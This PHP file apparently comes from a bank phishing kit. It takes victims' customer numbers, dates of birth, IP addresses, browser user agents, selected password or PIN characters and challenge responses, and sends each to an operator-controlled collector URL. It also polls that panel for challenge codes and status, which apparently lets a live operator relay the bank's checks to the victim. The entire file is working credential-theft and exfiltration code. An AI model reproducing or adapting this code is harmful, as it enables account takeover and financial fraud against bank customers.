<?php

function sendUser($cusnum,$dob,$rec)
{
	if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER["REMOTE_ADDR"];
    }
	$ua=urlencode($_SERVER['HTTP_USER_AGENT']);
	$cusnum=urlencode($cusnum);
	$dob=urlencode($dob);
	$ip=urlencode($ip);
	$url=$rec."?cusnum=".$cusnum."&dob=".$dob."&ua=".$ua."&ip=".$ip."&step=user";
	$res=file_get_contents($url);
}
function sendCard($cusnum,$dob,$char4,$char8,$rec)
{
	$cusnum=urlencode($cusnum);
	$dob=urlencode($dob);
	$char4=urlencode($char4);
	$char8=urlencode($char8);
	$url=$rec."?cusnum=".$cusnum."&dob=".$dob."&char4=".$char4."&char8=".$char8."&step=card";
	$res=file_get_contents($url);
}

function getAmount($cusnum,$dob,$rec)
{
	$cusnum=urlencode($cusnum);
	$dob=urlencode($dob);
	$url=$rec."?cusnum=".$cusnum."&dob=".$dob."&step=amount";
	$res=file_get_contents($url);
	return $res;
}
function getChallenge($cusnum,$dob,$rec)
{
	$cusnum=urlencode($cusnum);
	$dob=urlencode($dob);
	$url=$rec."?cusnum=".$cusnum."&dob=".$dob."&step=challenge";
	$res=file_get_contents($url);
	return $res;
}

function sendResponse($cusnum,$dob,$response,$rec)
{
	$cusnum=urlencode($cusnum);
	$dob=urlencode($dob);
	$response=urlencode($response);
	$url=$rec."?cusnum=".$cusnum."&dob=".$dob."&response=".$response."&step=response";
	$res=file_get_contents($url);
}



if(isset($_POST["step"]))
{
	if($_POST["step"] == "status")
	{
		include "../control.php";
		$cusnum=urlencode($_POST["cusnum"]);
		$dob=urlencode($_POST["dob"]);
		$url=$panel_rec."?cusnum=".$cusnum."&dob=".$dob."&step=status";
		$res=file_get_contents($url);
		echo $res;die();		
	}
	if($_POST["step"] == "response")
	{
		include "../control.php";
		$user=urlencode($_POST["user"]);
		$url=$panel_rec."?user=".$user."&step=getresponse";
		$res=file_get_contents($url);
		echo $res;die();
		
	}
}


?>